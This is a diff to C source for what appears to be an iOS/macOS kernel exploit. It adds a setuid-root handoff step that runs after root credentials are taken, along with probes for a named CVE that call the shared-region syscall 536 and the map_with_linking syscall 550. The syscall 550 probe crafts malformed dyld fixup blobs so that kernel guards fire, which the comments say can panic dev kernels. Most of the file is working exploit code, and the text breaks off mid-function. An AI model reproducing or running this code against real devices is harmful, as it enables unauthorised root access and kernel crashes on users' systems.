@@ -445,6 +445,19 @@ typedef uint8_t u8;
 #define SR_MAL_MAP     0x180040000ULL
 #endif
 
+/* iOS-only: the macOS shared-region constants do not match iOS geometry
+ * (real base reported by shared_region_check_np, e.g. 0x1992ac000 on iOS 27).
+ * When enabled, cmain discovers the runtime base via syscall 294 before
+ * building MAPS and targets that base instead of the compiled SR_BASE.
+ * The macOS Makefile build leaves this 0 -> byte-identical behavior. */
+#ifndef IO_SHARED_REGION_DYNAMIC
+#define IO_SHARED_REGION_DYNAMIC 0
+#endif
+
+#ifndef CACHE_PATH
+#define CACHE_PATH "/System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e"
+#endif
+
 #define PAGE_SZ        0x4000ULL
 #define VM_PROT_READ    0x1
 #define VM_PROT_ZF      0x10
@@ -579,10 +592,23 @@ static void
 suid_handoff(void)
 {
 	static const char wp[] = SUID_WRAPPER_PATH;
-	/* root now (own cred patched): make the staged wrapper setuid-root so a fresh
-	 * uid-501 process exec'ing it gets a LEGIT root cred (no SMR corruption). */
-	sc6(16, (long)wp, 0, 0, 0, 0, 0);     /* chown(wp,0,0) */
-	sc6(15, (long)wp, 04755, 0, 0, 0, 0); /* chmod(wp,04755) setuid */
+	/* root now (own cred patched): arm the staged wrapper setuid-root so a fresh
+	 * uid-501 process exec'ing it gets a LEGIT root cred (no SMR corruption).
+	 *
+	 * Ordering defense-in-depth: chmod 0600 (owner-only) BEFORE the chown so
+	 * that from the instant the file becomes root-owned it is already
+	 * non-writable by anyone but root (no instant where root-owned + writable
+	 * coexist). NOTE: this cannot stop a same-uid (501) process from
+	 * unlink()+replacing the staged file in sticky /tmp during the pre-chown
+	 * window (mode gates write-open, not unlink, and the attacker owns the
+	 * file). Residual same-uid race is accepted: such a process already holds
+	 * the same unprivileged creds the exploit starts from. Cross-uid plants are
+	 * already blocked by sticky /tmp + file ownership. suidwrap.c lstat-verifies
+	 * (regular file, root-owned, setuid bit) before trusting itself and unlinks
+	 * the path once it holds root, so the armed binary never persists. */
+	sc6(15, (long)wp, 0600, 0, 0, 0, 0);     /* chmod(wp,0600) owner-only */
+	sc6(16, (long)wp, 0, 0, 0, 0, 0);        /* chown(wp,0,0) */
+	sc6(15, (long)wp, 04755, 0, 0, 0, 0);    /* chmod(wp,04755) setuid */
 	S("[R] suid handoff chown0+chmod04755: ");
 	S(wp);
 	S("\n");
@@ -691,6 +717,28 @@ struct helper_page {
 static struct shared_file_np FILES[FILES_COUNT];
 static struct mapping MAPS[1 + TARGET_MAPS];
 static u64 CHECK_START;
+#if IO_SHARED_REGION_DYNAMIC > 0
+static u64 SR_BASE_RUNTIME;
+static u64 SR_MAL_MAP_RUNTIME;
+#endif
+
+#if IO_SHARED_REGION_DYNAMIC > 0
+/* sc6() returns the POSITIVE errno on failure (e.g. ENOENT=2 collides with a
+ * valid fd number 2), so verify an open() result is really an open fd via
+ * fcntl(F_GETFD) before using it as FILES[].sf_fd. */
+static long
+open_cache_checked(void)
+{
+	long fd = sc6(5, (long)CACHE_PATH, 0, 0, 0, 0, 0);
+	if (fd >= 0) {
+		long fl = sc6(92, fd, 1, 0, 0, 0, 0); /* fcntl(fd, F_GETFD) */
+		if (fl != 0) {
+			fd = -1;
+		}
+	}
+	return fd;
+}
+#endif
 #if GROOM_PAIRS > 0
 static u64 KEEP[GROOM_PAIRS];
 #endif
@@ -1905,6 +1953,10 @@ setup_oracle_regions(void)
 
 		p = sc6(197, 0, ORACLE_STRIDE * 2, PROT_RW, MAP_PRIVATE_ANON, -1, 0);
 		if (ok == 0 || (u64)p < 0x100000000ULL) {
+			/* Failure path: don't leak the just-mapped region (64 MiB VA). */
+			if ((u64)p >= 0x100000000ULL) {
+				sc6(73, p, ORACLE_STRIDE * 2, 0, 0, 0, 0); /* munmap */
+			}
 			break;
 		}
 		for (u64 j = 0; j < ORACLE_HOLE_PAGES; j++) {
@@ -2185,7 +2237,11 @@ prefault_later_pages(volatile char *base)
 static u64
 target_map_base(u64 map_index)
 {
+#if IO_SHARED_REGION_DYNAMIC > 0
+	return SR_BASE_RUNTIME + map_index * (u64)TARGET_SIZE;
+#else
 	return SR_BASE + map_index * (u64)TARGET_SIZE;
+#endif
 }
 
 static void
@@ -2339,6 +2395,34 @@ cmain(u64 *sp0)
 	H(PHYS_SCAN_WORD1_RUNTIME);
 #endif
 
+#if IO_SHARED_REGION_DYNAMIC > 0
+	/* Discover the real shared-region base before building MAPS. In a
+	 * dyld-linked iOS app the cache is already mapped, so 294 reports the
+	 * true base; in the static macOS child it may not be queryable yet, so
+	 * fall back to the compiled constants (identical behavior to before). */
+	/* 294-before-536 is only safe because of the fallback below: on kernels
+	 * where the region isn't queryable yet (or the result is out of the
+	 * shared-region window) we keep the compiled constants. */
+	CHECK_START = 0;
+	{
+		long geo_cr = sc6(294, (long)&CHECK_START, 0, 0, 0, 0, 0);
+		if (geo_cr == 0 && CHECK_START >= 0x180000000ULL && CHECK_START < 0x200000000ULL &&
+		    (CHECK_START & 0x3fffULL) == 0) {
+			SR_BASE_RUNTIME = CHECK_START;
+			/* SR_MAL_MAP convention: SR_BASE + TARGET_SIZE*TARGET_MAPS
+			 * (TARGET_SIZE == PAGES*0x4000, matching cflags.xcconfig). */
+			SR_MAL_MAP_RUNTIME = SR_BASE_RUNTIME + (u64)TARGET_SIZE * (u64)TARGET_MAPS;
+		} else {
+			SR_BASE_RUNTIME = SR_BASE;
+			SR_MAL_MAP_RUNTIME = SR_MAL_MAP;
+		}
+	}
+	S("[R] geo base=");
+	H(SR_BASE_RUNTIME);
+	S("[R] geo mal map=");
+	H(SR_MAL_MAP_RUNTIME);
+#endif
+
 	FILES[0].sf_fd = -1;
 	FILES[0].sf_mappings_count = 1;
 	FILES[0].sf_slide = 0;
@@ -2354,7 +2438,27 @@ cmain(u64 *sp0)
 	FILES[1].sf_slide = 0;
 #endif
 
+#if IO_SHARED_REGION_DYNAMIC > 0
+	/* A sandboxed iOS app CAN open the dyld cache (cryptexes cache path is
+	 * readable); use it. If the open fails, report it so an EINVAL at 536 is
+	 * understood as fd/sandbox limitation, not necessarily a kernel fix. */
+	{
+		long cache_fd = open_cache_checked();
+		if (cache_fd >= 0) {
+			FILES[1].sf_fd = (int)cache_fd;
+			S("[R] cache opened fd=");
+			H((u64)cache_fd);
+		} else {
+			S("[R] cache open failed (sandbox?) - using inherited fd 3\n");
+		}
+	}
+#endif
+
+#if IO_SHARED_REGION_DYNAMIC > 0
+	MAPS[0].sms_address = SR_MAL_MAP_RUNTIME;
+#else
 	MAPS[0].sms_address = SR_MAL_MAP;
+#endif
 	MAPS[0].sms_size = 0x4000;
 #if RUNTIME_HELPER > 0
 	u64 helper_addr = setup_helper_page();
@@ -2380,7 +2484,11 @@ cmain(u64 *sp0)
 #else
 		MAPS[m].sms_slide_size = sizeof(HELPER.mal);
 #endif
+#if IO_SHARED_REGION_DYNAMIC > 0
+		MAPS[m].sms_slide_start = SR_MAL_MAP_RUNTIME;
+#else
 		MAPS[m].sms_slide_start = SR_MAL_MAP;
+#endif
 		MAPS[m].sms_max_prot = VM_PROT_READ | VM_PROT_SLIDE;
 #if TARGET_NOAUTH > 0
 		MAPS[m].sms_max_prot |= VM_PROT_NOAUTH;
@@ -2404,7 +2512,11 @@ cmain(u64 *sp0)
 	H(CHECK_START);
 
 #if ABORT_ON_SETUP_FAIL > 0
+#if IO_SHARED_REGION_DYNAMIC > 0
+	if (r != 0 || cr != 0 || CHECK_START != SR_BASE_RUNTIME) {
+#else
 	if (r != 0 || cr != 0 || CHECK_START != SR_BASE) {
+#endif
 		S("[R] abort setup failed\n");
 		return;
 	}
@@ -2466,3 +2578,798 @@ cmain(u64 *sp0)
 	survive_forever();
 #endif
 }
+
+#if IO_SHARED_REGION_DYNAMIC > 0
+/* CVE-2026-43739 probe (iOS app only). Sweeps syscall 536 with IN-PAGE
+ * page_starts offsets only (0x0..0x3fff). In-page offsets are safe on ANY
+ * kernel: the v5 slide OOB write only fires when page_starts[i] >= page_size
+ * (0x4000), so this probe can never corrupt memory or panic. Results:
+ *   - all offsets EINVAL (22)  -> the dyld-linked app is rejected before the
+ *     slide walker runs (cache already mapped / harness artifact). The app
+ *     cannot reach the vulnerable path regardless of patch status.
+ *   - in-page offsets accepted -> the map path works from this app; testing
+ *     OOB offsets would then be the next (deliberately NOT done here: it can
+ *     panic on a vulnerable kernel).
+ */
+static struct helper_page PROBE_HELPER __attribute__((used, aligned(0x4000)));
+
+void
+CVE_2026_dyld_probe(void)
+{
+	static const u16 SWEEP[] = { 0x0000, 0x1000, 0x2000, 0x3fff };
+	u64 base = SR_BASE;
+	u64 mal_map = SR_MAL_MAP;
+	long cache_fd;
+
+	CHECK_START = 0;
+	{
+		long geo_cr = sc6(294, (long)&CHECK_START, 0, 0, 0, 0, 0);
+		if (geo_cr == 0 && CHECK_START >= 0x180000000ULL && CHECK_START < 0x200000000ULL &&
+		    (CHECK_START & 0x3fffULL) == 0) {
+			base = CHECK_START;
+			mal_map = base + (u64)TARGET_SIZE * (u64)TARGET_MAPS;
+		}
+	}
+	S("[P] geo base=");
+	H(base);
+	S("[P] geo mal map=");
+	H(mal_map);
+
+	cache_fd = open_cache_checked();
+	S("[P] cache fd=");
+	H((u64)cache_fd);
+
+	FILES[0].sf_fd = -1;
+	FILES[0].sf_mappings_count = 1;
+	FILES[0].sf_slide = 0;
+	FILES[1].sf_fd = cache_fd >= 0 ? (int)cache_fd : 3;
+	FILES[1].sf_mappings_count = TARGET_MAPS;
+	FILES[1].sf_slide = 0;
+
+	MAPS[0].sms_address = mal_map;
+	MAPS[0].sms_size = 0x4000;
+	MAPS[0].sms_file_offset = (u64)&PROBE_HELPER;
+	MAPS[0].sms_slide_size = 0;
+	MAPS[0].sms_slide_start = 0;
+	MAPS[0].sms_max_prot = VM_PROT_READ;
+	MAPS[0].sms_init_prot = VM_PROT_READ;
+
+	for (u64 i = 0; i < TARGET_MAPS; i++) {
+		u64 m = 1 + i;
+		MAPS[m].sms_address = base + i * (u64)TARGET_SIZE;
+		MAPS[m].sms_size = TARGET_SIZE;
+		MAPS[m].sms_file_offset = 0;
+		MAPS[m].sms_slide_size = sizeof(PROBE_HELPER.mal);
+		MAPS[m].sms_slide_start = mal_map;
+		MAPS[m].sms_max_prot = VM_PROT_READ | VM_PROT_SLIDE;
+		MAPS[m].sms_init_prot = VM_PROT_READ | VM_PROT_ZF;
+	}
+
+	for (u64 k = 0; k < sizeof(SWEEP) / sizeof(SWEEP[0]); k++) {
+		u16 off = SWEEP[k];
+		PROBE_HELPER.mal.version = 5;
+		PROBE_HELPER.mal.page_size = 16384;
+		PROBE_HELPER.mal.page_starts_count = PAGE_STARTS_COUNT;
+		PROBE_HELPER.mal.pad = 0;
+		PROBE_HELPER.mal.value_add = VALUE_ADD;
+		for (u64 i = 0; i < PAGE_STARTS_COUNT; i++) {
+			PROBE_HELPER.mal.page_starts[i] = off;
+		}
+		long r = sc6(536, FILES_COUNT, (long)&FILES[0], 1 + TARGET_MAPS, (long)&MAPS[0], 0, 0);
+		S("[P] page_starts=");
+		H((u64)off);
+		S("[P] 536 ret=");
+		H((u64)r);
+		S(r == 0 ? "[P] ACCEPTED\n" : "[P] rejected (22=EINVAL)\n");
+	}
+	if (cache_fd >= 0) {
+		sc6(6, cache_fd, 0, 0, 0, 0, 0); /* close */
+	}
+	S("[P] sweep complete - in-page offsets only, no OOB attempted\n");
+}
+
+/* ================= kernel-characterization probes (iOS app only) =================
+ * All of these sweep syscall 536 with IN-PAGE page_starts offsets only
+ * (<= 0x3fff). The v5 slide OOB write needs page_starts >= page_size (0x4000),
+ * so none of these can corrupt memory or panic on any kernel.
+ */
+
+static u64
+geo_base_runtime(void)
+{
+	u64 base = SR_BASE;
+	CHECK_START = 0;
+	{
+		long geo_cr = sc6(294, (long)&CHECK_START, 0, 0, 0, 0, 0);
+		if (geo_cr == 0 && CHECK_START >= 0x180000000ULL && CHECK_START < 0x200000000ULL &&
+		    (CHECK_START & 0x3fffULL) == 0) {
+			base = CHECK_START;
+		}
+	}
+	return base;
+}
+
+static void
+set_slide(u16 off, u64 va)
+{
+	PROBE_HELPER.mal.version = 5;
+	PROBE_HELPER.mal.page_size = 16384;
+	PROBE_HELPER.mal.page_starts_count = PAGE_STARTS_COUNT;
+	PROBE_HELPER.mal.pad = 0;
+	PROBE_HELPER.mal.value_add = va;
+	for (u64 i = 0; i < PAGE_STARTS_COUNT; i++) {
+		PROBE_HELPER.mal.page_starts[i] = off;
+	}
+}
+
+/* Build FILES/MAPS rooted at `root` instead of the default base: helper page at
+ * root, then TARGET_MAPS target regions at root+0x4000 + i*TARGET_SIZE. */
+static void
+build_maps_at(u64 root, long cache_fd)
+{
+	FILES[0].sf_fd = -1;
+	FILES[0].sf_mappings_count = 1;
+	FILES[0].sf_slide = 0;
+	FILES[1].sf_fd = cache_fd >= 0 ? (int)cache_fd : 3;
+	FILES[1].sf_mappings_count = TARGET_MAPS;
+	FILES[1].sf_slide = 0;
+
+	MAPS[0].sms_address = root;
+	MAPS[0].sms_size = 0x4000;
+	MAPS[0].sms_file_offset = (u64)&PROBE_HELPER;
+	MAPS[0].sms_slide_size = 0;
+	MAPS[0].sms_slide_start = 0;
+	MAPS[0].sms_max_prot = VM_PROT_READ;
+	MAPS[0].sms_init_prot = VM_PROT_READ;
+
+	for (u64 i = 0; i < TARGET_MAPS; i++) {
+		u64 m = 1 + i;
+		MAPS[m].sms_address = root + 0x4000 + i * (u64)TARGET_SIZE;
+		MAPS[m].sms_size = TARGET_SIZE;
+		MAPS[m].sms_file_offset = 0;
+		MAPS[m].sms_slide_size = sizeof(PROBE_HELPER.mal);
+		MAPS[m].sms_slide_start = root;
+		MAPS[m].sms_max_prot = VM_PROT_READ | VM_PROT_SLIDE;
+		MAPS[m].sms_init_prot = VM_PROT_READ | VM_PROT_ZF;
+	}
+}
+
+static void
+probe_ret(const char *tag, long r)
+{
+	long e = r < 0 ? -r : r;
+	S(tag);
+	H((u64)r);
+	if (e == 0) {
+		S("  ACCEPTED\n");
+	} else if (e == 9) {
+		S("  EBADF\n");
+	} else if (e == 14) {
+		S("  EFAULT\n");
+	} else if (e == 12) {
+		S("  ENOMEM\n");
+	} else if (e == 22) {
+		S("  EINVAL\n");
+	} else {
+		S("\n");
+	}
+}
+
+/* Region-slot sweep: try 536 at addresses the boot cache does NOT cover.
+ * If ANY slot is accepted, the app CAN reach the slide walker (huge signal).
+ * In-page starts only -> safe even on a vulnerable kernel. */
+void
+CVE_2026_dyld_probe_slots(void)
+{
+	u64 base = geo_base_runtime();
+	long cache_fd = open_cache_checked();
+	S("[L] --- 536 region-slot sweep (in-page only) ---\n");
+	S("[L] geo base=");
+	H(base);
+	S("[L] cache fd=");
+	H((u64)cache_fd);
+
+	static const u64 SLOTS[] = {
+		0x180000000ULL, 0x184000000ULL, 0x188000000ULL, 0x18c000000ULL,
+		0x190000000ULL, 0x194000000ULL, 0x198000000ULL, 0x19c000000ULL,
+		0x1a0000000ULL, 0x1a8000000ULL, 0x1b0000000ULL, 0x1b8000000ULL,
+		0x1c0000000ULL, 0x1d0000000ULL, 0x1e0000000ULL, 0x1f0000000ULL,
+	};
+	for (u64 i = 0; i < sizeof(SLOTS) / sizeof(SLOTS[0]); i++) {
+		u64 slot = SLOTS[i];
+		build_maps_at(slot, cache_fd);
+		set_slide(0x1000, VALUE_ADD);
+		long r = sc6(536, FILES_COUNT, (long)&FILES[0], 1 + TARGET_MAPS, (long)&MAPS[0], 0, 0);
+		S("[L] slot=");
+		H(slot);
+		probe_ret("[L]   ret=", r);
+	}
+	if (cache_fd >= 0) {
+		sc6(6, cache_fd, 0, 0, 0, 0, 0); /* close */
+	}
+	S("[L] note: an ACCEPTED slot stays mapped for the app's lifetime;\n");
+	S("[L]       re-running shows EINVAL (already mapped) for that slot\n");
+	S("[L] sweep complete - in-page offsets only, no OOB attempted\n");
+}
+
+/* Validation-order sweep: mutate one argument at a time and observe which
+ * error class wins. fd=-1 -> EBADF means fds are validated before the
+ * already-mapped check; EINVAL instead means the region check comes first. */
+void
+CVE_2026_dyld_probe_order(void)
+{
+	u64 base = geo_base_runtime();
+	long cache_fd = open_cache_checked();
+	S("[O] --- 536 validation-order sweep ---\n");
+	S("[O] geo base=");
+	H(base);
+	S("[O] cache fd=");
+	H((u64)cache_fd);
+
+	long r;
+
+	build_maps_at(base, cache_fd);
+	set_slide(0x1000, VALUE_ADD);
+	r = sc6(536, FILES_COUNT, (long)&FILES[0], 1 + TARGET_MAPS, (long)&MAPS[0], 0, 0);
+	probe_ret("[O] baseline           ret=", r);
+
+	build_maps_at(base, cache_fd);
+	set_slide(0x1000, VALUE_ADD);
+	FILES[1].sf_fd = -1;
+	r = sc6(536, FILES_COUNT, (long)&FILES[0], 1 + TARGET_MAPS, (long)&MAPS[0], 0, 0);
+	probe_ret("[O] fd=-1              ret=", r);
+
+	build_maps_at(base, cache_fd);
+	set_slide(0x1000, VALUE_ADD);
+	FILES[1].sf_fd = 9999;
+	r = sc6(536, FILES_COUNT, (long)&FILES[0], 1 + TARGET_MAPS, (long)&MAPS[0], 0, 0);
+	probe_ret("[O] fd=9999            ret=", r);
+
+	build_maps_at(base, cache_fd);
+	set_slide(0x1000, VALUE_ADD);
+	PROBE_HELPER.mal.version = 0xdeadbeef;
+	r = sc6(536, FILES_COUNT, (long)&FILES[0], 1 + TARGET_MAPS, (long)&MAPS[0], 0, 0);
+	probe_ret("[O] version=deadbeef   ret=", r);
+
+	build_maps_at(base, cache_fd);
+	set_slide(0x1000, VALUE_ADD);
+	PROBE_HELPER.mal.page_starts_count = 0;
+	r = sc6(536, FILES_COUNT, (long)&FILES[0], 1 + TARGET_MAPS, (long)&MAPS[0], 0, 0);
+	probe_ret("[O] count=0            ret=", r);
+
+	/* pure map, no slide info at all (reset slide state first so the result
+	 * can't be conflated with the stale version=0xdeadbeef/count=0 above) */
+	build_maps_at(base, cache_fd);
+	set_slide(0x1000, VALUE_ADD);
+	for (u64 i = 0; i <= TARGET_MAPS; i++) {
+		MAPS[i].sms_slide_size = 0;
+		MAPS[i].sms_slide_start = 0;
+		MAPS[i].sms_max_prot = VM_PROT_READ;
+	}
+	r = sc6(536, FILES_COUNT, (long)&FILES[0], 1 + TARGET_MAPS, (long)&MAPS[0], 0, 0);
+	probe_ret("[O] no-slide           ret=", r);
+
+	if (cache_fd >= 0) {
+		sc6(6, cache_fd, 0, 0, 0, 0, 0); /* close */
+	}
+	S("[O] sweep complete\n");
+}
+
+/* value_add / page_starts_count sweeps, in-page start only. If the rejection
+ * is uniform across all values, the kernel never even looks at slide contents
+ * from this app (consistent with an early already-mapped check). */
+void
+CVE_2026_dyld_probe_values(void)
+{
+	u64 base = geo_base_runtime();
+	long cache_fd = open_cache_checked();
+	S("[V] --- 536 value_add/count sweeps (in-page only) ---\n");
+	S("[V] geo base=");
+	H(base);
+	S("[V] cache fd=");
+	H((u64)cache_fd);
+
+	static const u64 VAS[] = {
+		0xffffffffffffc000ULL, /* -0x4000 (exploit default) */
+		0x0ULL,
+		0x1000ULL,
+		0x4141414141414141ULL,
+	};
+	for (u64 i = 0; i < sizeof(VAS) / sizeof(VAS[0]); i++) {
+		build_maps_at(base, cache_fd);
+		set_slide(0x1000, VAS[i]);
+		long r = sc6(536, FILES_COUNT, (long)&FILES[0], 1 + TARGET_MAPS, (long)&MAPS[0], 0, 0);
+		S("[V] value_add=");
+		H(VAS[i]);
+		probe_ret("[V]   ret=", r);
+	}
+
+	/* count must stay <= PAGE_STARTS_COUNT (1024): a larger count would make the
+	 * walker write past the 1024-page target region -> OOB. Not attempted. */
+	static const u32 COUNTS[] = { 0, 1, 512, 1024 };
+	for (u64 i = 0; i < sizeof(COUNTS) / sizeof(COUNTS[0]); i++) {
+		build_maps_at(base, cache_fd);
+		set_slide(0x1000, VALUE_ADD);
+		PROBE_HELPER.mal.page_starts_count = COUNTS[i];
+		long r = sc6(536, FILES_COUNT, (long)&FILES[0], 1 + TARGET_MAPS, (long)&MAPS[0], 0, 0);
+		S("[V] count=");
+		H((u64)COUNTS[i]);
+		probe_ret("[V]   ret=", r);
+	}
+
+	if (cache_fd >= 0) {
+		sc6(6, cache_fd, 0, 0, 0, 0, 0); /* close */
+	}
+	S("[V] sweep complete - in-page offsets only, no OOB attempted\n");
+}
+
+/* ================= syscall 550 (map_with_linking_np) / dyld_pager fixup probe =================
+ * The v5 slide path (syscall 536) is dead on xnu-13432 (iOS 27): slide info is no longer
+ * applied by vm_shared_region_slide_page_v5. dyld fixups are now applied LAZILY by the
+ * dyld pager (osfmk/vm/vm_dyld_pager.c), which dyld installs per cache via syscall 550
+ *   map_with_linking_np(struct mwl_region *regions, uint32_t region_count,
+ *                       struct mwl_info_hdr *link_info, uint32_t link_info_size)
+ * (mach/dyld_pager.h: mwl_region has the fd inside; mwl_info_hdr is MWL_INFO_VERS 7).
+ *
+ * On page fault the pager runs fixup_page() -> fixupCachePageAuth64/fixupPageAuth64
+ * (arm64e) or fixupPage32, which bounds-check segInfo->page_start[] against the
+ * link_info blob. The guards (with ktriage + printf, and a panic when
+ * panic_on_dyld_issue is set) are:
+ *   "out of range segInfo->page_start[pageIndex]"      (fixupCachePageAuth64/Auth64)
+ *   "out of range segInfo->page_start[overflowIndex]"  (fixupPage32, MULTI start)
+ *   "seg->page_count out of bounds" / "too small"     (fixup_page)
+ *   "seg->size out of bounds" / "too small", "seg_info out of bounds" (fixup_page)
+ *   "delta offset > page size", "chain 0x.. out of range", "bind ordinal" (chain walk)
+ *
+ * This probe crafts mwl_info_hdr blobs whose segment geometry makes the faulted
+ * pageIndex outrun the page_start[] array so the guard FIRES on-device:
+ *   - release kernels (panic_on_dyld_issue=0): fixup returns KERN_FAILURE -> the fault
+ *     fails -> SIGBUS/SIGSEGV in the faulting process
+ *   - dev kernels (panic_on_dyld_issue=1): kernel panic carrying the guard string
+ * Either way the kernel log / panic log gets the fixup_* message.
+ *
+ * map_with_linking_np requires an EXISTING private COW mapping of the cache fd at
+ * mwlr_address (vm_map_with_linking() overmaps it with the pager), so each variant
+ * first mmaps the cache. The fault is done in a forked child using raw syscalls only
+ * (the app links a stubbed libSystem), so a guard-fire SIGBUS kills the child, never
+ * the app.
+ */
+
+struct mwl_region_np {
+	int32_t mwlr_fd;
+	uint32_t mwlr_protections;
+	u64 mwlr_file_offset;
+	u64 mwlr_address;
+	u64 mwlr_size;
+};
+
+struct mwl_info_hdr_np {
+	u32 mwli_version;
+	u16 mwli_page_size;
+	u16 mwli_pointer_format;
+	u32 mwli_binds_offset;
+	u32 mwli_binds_count;
+	u32 mwli_chains_offset;
+	u32 mwli_chains_size;
+	u64 mwli_slide;
+	u64 mwli_image_address;
+};
+
+struct mwl_starts_image_np {
+	u32 seg_count;
+	u32 seg_info_offset[1];
+};
+
+struct mwl_starts_segment_np {
+	u32 size;
+	u32 page_size;
+	u16 pointer_format;
+	u64 segment_offset;
+	u32 max_valid_pointer;
+	u16 page_count;
+	u16 page_start[1];
+};
+
+#define MWL_HDR_SZ        0x28  /* sizeof(mwl_info_hdr) */
+#define MWL_IMG_OFF       0x28  /* dyld_chained_starts_in_image follows the header */
+#define MWL_SEG_OFF       0x30  /* first segment follows the image struct */
+#define MWL_PTR_FMT_32    3     /* DYLD_CHAINED_PTR_32 */
+#define MWL_PTR_FMT_CACHE 9     /* DYLD_CHAINED_PTR_ARM64E_SHARED_CACHE */
+#define MWL_START_NONE    0xffff
+#define MWL_START_MULTI   0x8000
+#define MWL_SIGBUS        10
+#define MWL_SIGSEGV       11
+
+static struct mwl_region_np MWL_REGIONS[1];
+static u8 MWL_BLOB[0x1000] __attribute__((aligned(0x4000)));
+
+static u32
+mwl_blob_size(u32 starts_n)
+{
+	return MWL_SEG_OFF + 0x20 + 2 * starts_n;
+}
+
+static void
+mwl_build_blob(u64 image_address, u16 ptr_fmt, u32 seg_page_size,
+    u32 page_count, const u16 *starts, u32 starts_n)
+{
+	struct mwl_info_hdr_np *hdr = (struct mwl_info_hdr_np *)MWL_BLOB;
+	struct mwl_starts_image_np *img;
+	struct mwl_starts_segment_np *seg;
+	u32 i;
+
+	for (i = 0; i < 0x1000; i++) {
+		MWL_BLOB[i] = 0;
+	}
+	/* kernel gates (verified in the iOS 27 kernelcache): version==7,
+	 * header page_size==0x4000, binds/chains offsets+size fit the blob. */
+	hdr->mwli_version = 7;
+	hdr->mwli_page_size = 0x4000;
+	hdr->mwli_pointer_format = ptr_fmt;
+	hdr->mwli_binds_offset = MWL_HDR_SZ;
+	hdr->mwli_binds_count = 0;
+	hdr->mwli_chains_offset = MWL_HDR_SZ;
+	hdr->mwli_slide = 0;
+	hdr->mwli_image_address = image_address;
+
+	img = (struct mwl_starts_image_np *)(MWL_BLOB + MWL_IMG_OFF);
+	img->seg_count = 1;
+	img->seg_info_offset[0] = MWL_SEG_OFF - MWL_IMG_OFF; /* 8 */
+
+	seg = (struct mwl_starts_segment_np *)(MWL_BLOB + MWL_SEG_OFF);
+	seg->size = 0x20 + 2 * starts_n; /* >= sizeof(seg), page_start[] included */
+	seg->page_size = seg_page_size;
+	seg->pointer_format = ptr_fmt;
+	seg->segment_offset = 0;         /* segStart == mwli_image_address == mapping VA */
+	seg->max_valid_pointer = 0;
+	seg->page_count = page_count;
+	for (i = 0; i < starts_n; i++) {
+		seg->page_start[i] = starts[i];
+	}
+
+	hdr->mwli_chains_size = (MWL_SEG_OFF - MWL_IMG_OFF) + seg->size;
+}
+
+static u64
+mwl_mmap(long cache_fd, u64 size, u64 foff)
+{
+	/* mmap(0, size, PROT_READ, MAP_PRIVATE, fd, off): creates the COW file mapping
+	 * that vm_map_with_linking() requires at mwlr_address. */
+	return (u64)sc6(197, 0, size, VM_PROT_READ, 0x2 /* MAP_PRIVATE */, cache_fd, foff);
+}
+
+static long
+mwl_call550(u64 va, u64 size, u64 foff, long cache_fd, u32 blob_sz)
+{
+	long r;
+
+	MWL_REGIONS[0].mwlr_fd = (int32_t)cache_fd;
+	MWL_REGIONS[0].mwlr_protections = 0x3; /* READ|WRITE: passes the prot gates */
+	MWL_REGIONS[0].mwlr_file_offset = foff;
+	MWL_REGIONS[0].mwlr_address = va;
+	MWL_REGIONS[0].mwlr_size = size;
+	r = sc6(550, (long)&MWL_REGIONS[0], 1, (long)MWL_BLOB, blob_sz, 0, 0);
+	S("[M]   550 ret=");
+	H((u64)r);
+	if (r == 0) {
+		S("[M]   ACCEPTED - dyld pager installed over the mapping\n");
+	} else {
+		S("[M]   rejected (22=EINVAL 12=ENOMEM 9=EBADF 14=EFAULT)\n");
+	}
+	return r;
+}
+
+/* Fault the pager page in a forked child using raw syscalls only. A guard-fire
+ * SIGBUS/SIGSEGV kills the child; the parent survives and reports the signal. */
+static void
+mwl_fault_page(u64 va, u64 fault_off)
+{
+	long pid = sc6(2, 0, 0, 0, 0, 0, 0); /* fork */
+	if (pid == 0) {
+		volatile u64 v = *(volatile u64 *)(va + fault_off); /* fault -> fixup */
+		(void)v;
+		sc6(1, 0, 0, 0, 0, 0, 0); /* exit(0): page was readable */
+	}
+	if (pid < 0) {
+		S("[M]   fork failed, skipping fault\n");
+		return;
+	}
+	{
+		long st = 0;
+		sc6(61, pid, (long)&st, 0, 0, 0, 0); /* wait4 */
+		if ((st & 0x7f) != 0) {
+			S("[M]   fault SIG=");
+			H((u64)(st & 0x7f));
+			S("[M]   GUARD FIRED (fixup returned KERN_FAILURE) - check the kernel log /\n");
+			S("[M]   panic log for the fixup_* guard string (page_start[pageIndex],\n");
+			S("[M]   page_start[overflowIndex], seg->page_count, delta, chain, ...)\n");
+		} else {
+			S("[M]   fault OK (page readable, child exit=");
+			H((u64)((st >> 8) & 0xff));
+			S(")\n");
+		}
+	}
+}
+
+static void
+mwl_run_variant(const char *name, long cache_fd, u64 foff, u64 map_size,
+    u16 ptr_fmt, u32 seg_page_size, u32 page_count, const u16 *starts, u32 starts_n,
+    u64 fault_off)
+{
+	u64 va;
+	u32 blob_sz = mwl_blob_size(starts_n);
+	long r;
+
+	S("[M] --- variant: ");
+	S(name);
+	S(" (ptrfmt=");
+	H((u64)ptr_fmt);
+	S("[M]      seg_page_size=");
+	H((u64)seg_page_size);
+	S("[M]      page_count=");
+	H((u64)page_count);
+	S("[M]      starts_n=");
+	H((u64)starts_n);
+	S("[M]      fault_off=");
+	H(fault_off);
+	S("\n");
+
+	va = mwl_mmap(cache_fd, map_size, foff);
+	S("[M] mmap va=");
+	H(va);
+	if (va == 0xffffffffffffffffULL || va < 0x100000000ULL) {
+		S("[M]   mmap failed, variant skipped\n");
+		return;
+	}
+
+	mwl_build_blob(va, ptr_fmt, seg_page_size, page_count, starts, starts_n);
+	r = mwl_call550(va, map_size, foff, cache_fd, blob_sz);
+	if (r == 0) {
+		mwl_fault_page(va, fault_off);
+	}
+	sc6(73, va, map_size, 0, 0, 0, 0); /* munmap */
+	S("[M] done\n");
+}
+
+void
+CVE_2026_dyld_probe_mwl(void)
+{
+	u64 base;
+	long cache_fd;
+	static const u16 ST_NONE1[1] = { MWL_START_NONE };
+	static const u16 ST_NONE2[2] = { MWL_START_NONE, MWL_START_NONE };
+	/* MULTI + huge overflowIndex (0x1000): &page_start[0x1001] lands far past the
+	 * blob end so the 'page_start[overflowIndex]' guard fires deterministically. */
+	static const u16 ST_OVERFLOW[2] = { MWL_START_MULTI | 0x1000, MWL_START_NONE };
+	static const u16 ST_CHAIN0[2] = { 0x0000, MWL_START_NONE };
+
+	S("[M] --- 550 map_with_linking_np / dyld_pager fixup guard probe ---\n");
+	S("[M] NOTE: if this dev kernel has panic_on_dyld_issue=1 a guard PANICS the\n");
